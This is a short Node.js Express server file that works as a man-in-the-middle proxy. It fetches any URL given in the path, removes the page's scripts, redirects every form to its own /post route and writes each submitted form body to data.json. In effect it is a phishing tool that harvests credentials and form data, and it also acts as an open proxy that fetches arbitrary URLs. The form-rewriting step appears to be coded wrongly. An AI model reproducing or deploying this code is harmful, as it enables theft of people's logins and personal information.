// index.js

var express = require('express')
,	jsop = require('jsop')
,	bodyParser = require('body-parser')
,	session = require('express-session')
,	request = require('request')
,	cheerio = require('cheerio')
;

var app = express()
,	data = jsop('./data.json')
;

app
	.use(bodyParser.urlencoded({ extended: false }))
	.use(bodyParser.json())
	.route('*')
		.get(onGet)
		.post(onPost);

function onGet(req, res) {
	var url = req.originalUrl.substring(1);
	if (url.match(/^(http|https):\/\//gi)) {
		console.log('Recieved request to:', url);
		request(url, function(error, response, body) {
			if (!error) {
				var cType = response.headers['content-type'];
				res.setHeader('content-type', cType);
				if (cType.match(/^text\/html.*/gi)) {
					var $ = cheerio.load(body);
					$('script').remove();
					$('form').each(function(a, b) {
						b.attr('action', '/post');
					});
					$('body').append($('<script></script>').attr('src', '//code.jquery.com/jquery-latest.min.js'));
					res.send($.html());
				} else {
					res.send(body);
				}
			}
		});
	}
}

function onPost(req, res) {
	if (!data.entries) {
		data.entries = [];
	}
	console.log('Recieved data from:',req.originalUrl);
	data.entries.push(req.body);
	res.json('success');
}

app.listen(process.env.PORT);
